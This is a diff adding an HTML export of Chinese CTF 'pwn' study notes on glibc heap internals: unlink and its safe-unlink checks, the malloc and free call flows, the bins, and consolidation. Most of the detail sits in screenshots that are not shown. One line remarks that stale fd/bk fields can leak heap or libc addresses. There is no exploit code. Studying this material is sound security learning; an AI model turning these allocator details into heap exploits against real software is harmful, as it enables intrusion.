@@ -1,0 +1,1498 @@
+<html>
+<head>
+<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+<meta content="text/css" http-equiv="Content-Style-Type">
+<title>CTF PWN9</title>
+</head>
+<body>
+<h1 align="center" class="root">
+<a name="5led3vs0jejgc9uqfav9tt6kt2">CTF PWN9</a>
+</h1>
+<h2 class="topic">
+<a name="3223rrgrithvl7lulkibr7j0q0">堆溢出</a>
+</h2>
+<h3 class="topic">
+<a name="7ebnc3m21g6jgnpj84kml8v3if">&nbsp;深入理解堆的实现（本部分学习过程中对于堆代码的实现只有大概的认识，具体细节不是很理解）</a>
+</h3>
+<h3 class="topic">
+<a name="4tkrbdjoq8lj3pbgdp25pl2q0v">&nbsp;&nbsp;思考角度</a>
+</h3>
+<h3 class="topic">
+<a name="48in4nu75rnvmjdldq503ro330">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/4ih6g0n95ubdgdbotce7u024ef.png"></p>
+<h3 class="topic">
+<a name="6s38s948afm0athcjc2153ev3n">&nbsp;&nbsp;堆初始化</a>
+</h3>
+<h3 class="topic">
+<a name="7sona4m5sjlehk3bolvi6fobc2">&nbsp;&nbsp;&nbsp;堆初始化是在用户第一次申请内存时执行 malloc_consolidate 再执行 malloc_init_state 实现的。这里不做过多讲解。可以参见 malloc_state 相关函数</a>
+</h3>
+<h3 class="topic">
+<a name="786uk381ktbh2kintb4gvntrju">&nbsp;&nbsp;创建堆</a>
+</h3>
+<h3 class="topic">
+<a name="78edp3vibb77q9or6a176ln00f">&nbsp;&nbsp;&nbsp;双向链表相关操作</a>
+</h3>
+<h3 class="topic">
+<a name="48q6276e0nkrtcrhfdiac4to0f">&nbsp;&nbsp;&nbsp;&nbsp;Unlink</a>
+</h3>
+<h3 class="topic">
+<a name="5vk487ohn2smscanpc2cl431ru">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将chunk从双向链表中断链的操作无论申请内存还是合并chunk均需要使用到，图中应该是说small bin中没有使用带安全验证的unlink机制</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/1freir9h2f9gn2d6r95g5uq57i.png"></p>
+<h3 class="topic">
+<a name="7s5mlo16vu59vc689p9nusm28n">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Unlink的实现，注意unlink的过程中存在安全性检验，即safe unlink</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/69iu7npp3hq96l38l4dbcs82uu.png"></p>
+<h3 class="topic">
+<a name="2ru7qpp3nuqunrj1juksibm80i">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一个small bin的unlink的实例，注意因为large unlink中存在fd_nextsize ，bk_nextsize字段，所以Unlink过程中存在对该两个字段的检测</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/42s34re2vobkd11ugt17ab9k4n.png"></p>
+<h3 class="topic">
+<a name="01sgop04qa5arcfu38s821boud">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当chunk被unlink之后，该chunk中的fd bk字段值均不会变化，可以利用这一点，泄露队堆或libc的地址</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/7fdcmk8099s5rak3noks670cb2.png"></p>
+<h3 class="topic">
+<a name="4ojqplaq3n6i65j3v2k1eu8524">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unlink过程中对fd，bk、 fd_nextsize ，bk_nextsize字段值进行检验，防止通过修改以上字段从而在unlink的过程中写任意地址</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/76qm9hjqe785557cp877i75rdn.png"></p>
+<h3 class="topic">
+<a name="4br1tdum2k5jeicdnu681dolce">&nbsp;&nbsp;&nbsp;&nbsp;申请内存块</a>
+</h3>
+<h3 class="topic">
+<a name="00bqrdl1ucbb9n953ic5oc10eb">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;函数调用流程 malloc-》 __libc_malloc -》_int_malloc</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/53ga7rotkgktr9eftt4miul3u2.png"></p>
+<h3 class="topic">
+<a name="6hb4dti8ee36e18g9k6lh0unnc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__libc_malloc</a>
+</h3>
+<h3 class="topic">
+<a name="5js674ms0bcfqsgnp1k9esbf42">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先检测是否存在__malloc_hook函数，该函数主要用于用户自定义的堆分配，用户申请的字节一旦进入申请内存函数中就变成了无符号整数。</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/0d1baguft763hp2lruhtls2hsb.png"></p>
+<h3 class="topic">
+<a name="3ssjb0456lfbqt9f2k9r8dnfa4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/15vunlqp3dvlkg5pc1nur6joqb.png"></p>
+<h3 class="topic">
+<a name="7o45ukmsuv385sani80tohbg70">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/4kcniq7htt7mh1rrngh0rocgdl.png"></p>
+<h3 class="topic">
+<a name="2qkukudre40pi3nfs1b27qcfae">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_int_malloc</a>
+</h3>
+<h3 class="topic">
+<a name="57c2m2r28ad78e6fmiace2c988">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;核心思路</a>
+</h3>
+<h3 class="topic">
+<a name="12itng6v18vbd5je06ff2ftvh9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/0sa038ihatcfn6ssll5ugera9d.png"></p>
+<h3 class="topic">
+<a name="1uoc2f52agamj8ks154qa340c0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;流程（细节没有太看懂）</a>
+</h3>
+<h3 class="topic">
+<a name="49vuv468481d57398jd365hn93">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将用户申请的内存转换为内部的chunk的大小</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/090s836le1tfbcjtef6jv5lc04.png"></p>
+<h3 class="topic">
+<a name="5tc4fehha9lv2vpgg5hacun73q">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;检测当前arena是否可用</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/52c3ldufhgb0noacf8n53p02nb.png"></p>
+<h3 class="topic">
+<a name="1jeops3jnbshuvrdmhik61e3ru">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果申请的chunk大小落在fast bin的范围内</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/2elodefu3ou2gsnm3nhkrafn23.png"></p>
+<h3 class="topic">
+<a name="0bdal47i3lsnan1a6m9simpb0d">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果申请的chunk大小落在small bin的范围内</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/5g9t7vrhistjq1c8in3oj4bpqs.png"></p>
+<h3 class="topic">
+<a name="396f5c6q0deak6hki7g3bkcpru">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当使用large bin时首先会判断程序中是否存在fast bin，然后调用malloc_consolidate函数将fast bin中可以合并的chunk全部合并，放到unsorted bin中，此举是为了减少堆中的碎片</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/3j23pc2a7ba19k6kt1fe4uglfg.png"></p>
+<h3 class="topic">
+<a name="2qaf2kno5b4ql95bdq85dtkvpv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/26gdp46jotflevqsrc901pa2in.png"></p>
+<h3 class="topic">
+<a name="4uuhdar564itjedaubqsobjgnq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/2aikgej2e0l0li22qe4v2h8b60.png"></p>
+<h3 class="topic">
+<a name="10pfrvjit089k8ekpp8ard068m">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/752e46o8k6cetd0q2oiv53vn6a.png"></p>
+<h3 class="topic">
+<a name="5eqqcj2c8f1hb6t21rrv0o935p">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/31d20a4qar2clav8aet7u8f2lm.png"></p>
+<h3 class="topic">
+<a name="4dnfi9f3q9osl8ga72kaoasaq5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/2k31vh8p8oc45v7t3dip5opji9.png"></p>
+<h3 class="topic">
+<a name="2icbnfv01nrv3jl70fn6rpi1up">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;内容接下图</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/76ifsqrnkp3mr6884fegafbqcf.png"></p>
+<h3 class="topic">
+<a name="5v92q5ege612u1h44bou0mf7h8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;内容承上图</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/4ns5lem8ue91dg3r0jmr2lp9o5.png"></p>
+<h3 class="topic">
+<a name="3nphsfkh6hgukjv8ovisin1fks">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/41cjfmaijh7s1es3h41j1e2mbr.png"></p>
+<h3 class="topic">
+<a name="5r81kn94rogvi5rblfen55egko">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果chunk的大小在large bin范围内 接下图</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/0srnmgoash112963sa8vcofg0u.png"></p>
+<h3 class="topic">
+<a name="771v3e3lev2bdaq26eg4j7gmjh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;承上图</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/0a5gs60r5ild21tkpfcmp2e529.png"></p>
+<h3 class="topic">
+<a name="475qors3j0ahfip61k9hokkctd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/48ma0m8820ob9oqv77odaucosh.png"></p>
+<h3 class="topic">
+<a name="0a9s6adeh0q33m9befi1pbgdoh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/5r0ddoqf5t0pcp42ltnt625mta.png"></p>
+<h3 class="topic">
+<a name="43q562u4bgmgmj5em9nl3oa8oa">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下图</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/7a7ej9og05e88mvt2fnhav1srb.png"></p>
+<h3 class="topic">
+<a name="3ullec529jloaa08ipilo8d4dm">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;承上图</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/60e9l4ql38afh3i0oljc10mmng.png"></p>
+<h3 class="topic">
+<a name="2bgotv9f5qfntepuecv30uc0ek">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下图</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/1d72n0ftfd41vgtii93q834h9b.png"></p>
+<h3 class="topic">
+<a name="2ujqp92kmi3m3aa66dtlb3mvs6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;承上图</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/41parmiam96rnd0p0i7e5o9la6.png"></p>
+<h3 class="topic">
+<a name="12dcjcbjfqfnrens3kn77aehok">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用calloc函数申请内存</a>
+</h3>
+<h3 class="topic">
+<a name="091m3j2j0ct5k3m60ansga0m20">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/2o7c1uqd7hej99bmo4ob36qo8o.png"></p>
+<h3 class="topic">
+<a name="090490hpvl8rihjsf0p54sehbg">&nbsp;&nbsp;&nbsp;&nbsp;释放内存块</a>
+</h3>
+<h3 class="topic">
+<a name="7urv82kfim73vka3aa446unh8q">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__libc_free</a>
+</h3>
+<h3 class="topic">
+<a name="3kot08v35s03c5bi49so7ddt60">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;与malloc类似 执行free函数释放内存的过程中，函数调用顺序为free-》__libc_free-》_int_free ，__libc_free中会先检查是否存在__free_hook函数，然后调用_int_free函数</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/6ukk9h7uts4p8o6s0j0smv8ibn.png"></p>
+<h3 class="topic">
+<a name="1pqql397o8mrhnfg1d0s0uqpq6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_int_free</a>
+</h3>
+<h3 class="topic">
+<a name="1pgq0bfs45cjorb2ojd64g0762">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/6vogsu41cijv4ag4c8hchlafa4.png"></p>
+<h3 class="topic">
+<a name="25d3bng6lk3uaarkkcb7sjs2kj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/105rgaeq4gicousk78nqgtsqj6.png"></p>
+<h3 class="topic">
+<a name="5fmn8c2t698940c27r2pm6fbbq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;检查该chunk是否是fastbin中的chunk，接下图</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/29pn2qkbv43c4smp44k5jkf6hi.png"></p>
+<h3 class="topic">
+<a name="0vqo9ihf1mhqnp4ttqet65o97r">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;承上图</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/7empsh3gfn7q2ic5j2pkd796j6.png"></p>
+<h3 class="topic">
+<a name="6r12aj6dfd1mnilr73kl3bi671">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;合并非mmap的空闲chunk</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/0nf0snjpsmdqshhifb6rk1squm.png"></p>
+<h3 class="topic">
+<a name="255i4q9cmddl3atih5toj6d498">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/2uu8lk1lh3v7rujee62i0ot4p0.png"></p>
+<h3 class="topic">
+<a name="3mpdoj16t9pimkf46n1bg4icc6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/238tss336s1588noic6c39buum.png"></p>
+<h3 class="topic">
+<a name="6047bf5quhk58a47h9ovfc98gj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果下一块不是topchunk，则合并高地址的chunk，并将合并后的chunk放在unsorted bin中 </a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/1kvmdq3nroq1eafkv7qbktlb5j.png"></p>
+<h3 class="topic">
+<a name="76ivj8kvpclla3a5km9hecq113">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/591eogevq06g4c37khp09lo334.png"></p>
+<h3 class="topic">
+<a name="5o6102uiceojro4d7madp8dn90">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/6sdn2o1e9lpuoknqku4jdno8em.png"></p>
+<h3 class="topic">
+<a name="53tq2qnv6832rhtlinq2j31h6n">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/7fq1doqpo6sqs51a24cq209u5h.png"></p>
+<h3 class="topic">
+<a name="3ueok1ac7odsnao225287ffer4">&nbsp;&nbsp;删除堆</a>
+</h3>
+<h3 class="topic">
+<a name="4uvmcitk1tgs65hg362drm6a2o">&nbsp;&nbsp;&nbsp;malloc_init_state</a>
+</h3>
+<h3 class="topic">
+<a name="2mcr7ianhjos32mrpmhiek53vr">&nbsp;&nbsp;&nbsp;&nbsp;该函数只能在malloc_consolidate函数中被调用</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/31r20hfhlagu0bqojptmgb7o94.png"></p>
+<h3 class="topic">
+<a name="35c7jf0og5ig11i1lirgb12b71">&nbsp;&nbsp;&nbsp;malloc_consolidate</a>
+</h3>
+<h3 class="topic">
+<a name="3fq7pnft070pcq1h89vqsjif4l">&nbsp;&nbsp;&nbsp;&nbsp;该函数主要用于在fastbin未初始化的时候进行初始化，在fastbin已经初始化的时候合并fastbin中的chunk</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/382tlf5mokgnkc6l4q9s541k9q.png"></p>
+<h3 class="topic">
+<a name="1c89vegf7e3ce7ujf4748r0kbo">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/51it5ub4sfdl92suuofhnanu3j.png"></p>
+<h3 class="topic">
+<a name="1hi47674f22gmq4irpc9t60ipq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/2tk4m04c4sq9kee205pvjqmtlk.png"></p>
+<h3 class="topic">
+<a name="1b4p9n7dk39etis3lhq50ttu5d">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/1f65s2b6spdnsvbfo38i2dsha3.png"></p>
+<h3 class="topic">
+<a name="4svm68rdptc9a6t16ikg23vljr">&nbsp;&nbsp;glibc</a>
+</h3>
+<h3 class="topic">
+<a name="649kdri2rdkpf3bghjbchpscj1">&nbsp;&nbsp;&nbsp;mallloc</a>
+</h3>
+<h3 class="topic">
+<a name="3dre6rgqcbvrbtgt9ad2ljmdtq">&nbsp;&nbsp;&nbsp;&nbsp;找arena上锁</a>
+</h3>
+<h3 class="topic">
+<a name="7gnik1jjfcfdeg6rn8bki9tbrm">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;计算实际chunk大小</a>
+</h3>
+<h3 class="topic">
+<a name="7eiv9ljc9j21dnv00bu9kbbt2v">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;判断chunk的尺寸</a>
+</h3>
+<h3 class="topic">
+<a name="586bt2cc4gf2dp1i4op1o02b6a">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果chunk_size&lt;=64B</a>
+</h3>
+<h3 class="topic">
+<a name="2jmdd03mr52q8pctoavi7tuo43">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;search fastbins</a>
+</h3>
+<p class="relationships">参见: <a href="#1qra5tvqevn002c930cem54n74">判断chunk_size与512B大关系 (fast bin中没有搜索到)</a>
+</p>
+<h3 class="topic">
+<a name="5qjnqkdmlktcbs88h0ckgv04e9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果chunk_size&gt;64B</a>
+</h3>
+<h3 class="topic">
+<a name="1qra5tvqevn002c930cem54n74">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;判断chunk_size与512B大关系</a>
+</h3>
+<p class="relationships">参见: <a href="#2jmdd03mr52q8pctoavi7tuo43">search fastbins (fast bin中没有搜索到)</a>
+</p>
+<h3 class="topic">
+<a name="1jktja8i08q297fagt71df04vj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果chunk_size&lt;512B</a>
+</h3>
+<h3 class="topic">
+<a name="348c2il9qif138f6kbjkl46tkk">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;search smallbins（如果找到直接返回）</a>
+</h3>
+<h3 class="topic">
+<a name="33bneqo4d3b25ijrdrll8lp6vq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;search unsortedbins（如果找到之直接返回）</a>
+</h3>
+<p class="relationships">参见: <a href="#1fjogegvk8oai8h9hsb06deq4p">合并fastbin将fastchunk链入unsortedbins（此时fastbin如果物理毗邻可能进行合并） (跳转到)</a>
+</p>
+<h3 class="topic">
+<a name="7c37po3jrvrk8jvdb5g7apgj8n">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果unsortedbins中没有找到，则将unsortedbins中所有chunk放回各自的normalbins（即smallbins中或largebins中）中</a>
+</h3>
+<h3 class="topic">
+<a name="3cqotjccqmii104av8b48idie8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;search largebins（如果找到直接返回）</a>
+</h3>
+<h3 class="topic">
+<a name="2vthn6m2hc4ma6agmav309mnsr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果没找到，需要分割top chunk作为chunk空间</a>
+</h3>
+<h3 class="topic">
+<a name="0vugvsv7j8np0nr5abb759beef">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果topchunk也不满足，判断&#13;
+size&gt;mmap阈值（128k）</a>
+</h3>
+<h3 class="topic">
+<a name="3s9r6jjvmi4at9cdhojrlt9kg0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;是</a>
+</h3>
+<h3 class="topic">
+<a name="50kle8ilddej5icd45ukf4ch26">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;直接进行mmap</a>
+</h3>
+<h3 class="topic">
+<a name="5aq9q4fmnk1e14eencmfbptmqf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;否</a>
+</h3>
+<h3 class="topic">
+<a name="1fpv28j371ji36ld193mba8g33">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果此时是在thread arena中，直接进行mmap</a>
+</h3>
+<h3 class="topic">
+<a name="2fmbqcug9v3vulcl57dprh0bqd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果此时在main arena中，先通过sbrk()进行堆区膨胀，如果sbrk()执行失败，使用mmap()出新的heap</a>
+</h3>
+<h3 class="topic">
+<a name="6tc6riqhrvaauu1li1him0u3se">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果chunk_size&gt;=512B</a>
+</h3>
+<h3 class="topic">
+<a name="1fjogegvk8oai8h9hsb06deq4p">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;合并fastbin将fastchunk链入unsortedbins（此时fastbin如果物理毗邻可能进行合并）</a>
+</h3>
+<p class="relationships">参见: <a href="#33bneqo4d3b25ijrdrll8lp6vq">search unsortedbins（如果找到之直接返回） (跳转到)</a>
+</p>
+<h3 class="topic">
+<a name="4do7amb5e6pefmlvlfan002v04">&nbsp;&nbsp;&nbsp;free</a>
+</h3>
+<h3 class="topic">
+<a name="1t9k4lga4r5ggqfagb2qrulh57">&nbsp;&nbsp;&nbsp;&nbsp;找arena上锁</a>
+</h3>
+<h3 class="topic">
+<a name="0fivm0un9m41fhdavb76p3ban1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;是否与topchunk相邻</a>
+</h3>
+<h3 class="topic">
+<a name="4jpf6839cui11e35klr69k7d0t">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;是</a>
+</h3>
+<h3 class="topic">
+<a name="66rlbebin5bhgjqab8e4val956">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;被free的chunk是否为mmaped chunk？</a>
+</h3>
+<p class="relationships">参见: <a href="#14u6dcrg84mop8ilqii38d4qif">否 (跳转到)</a>
+</p>
+<h3 class="topic">
+<a name="02gog2sfopmdqob5l8ar2cgmhs">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;是</a>
+</h3>
+<h3 class="topic">
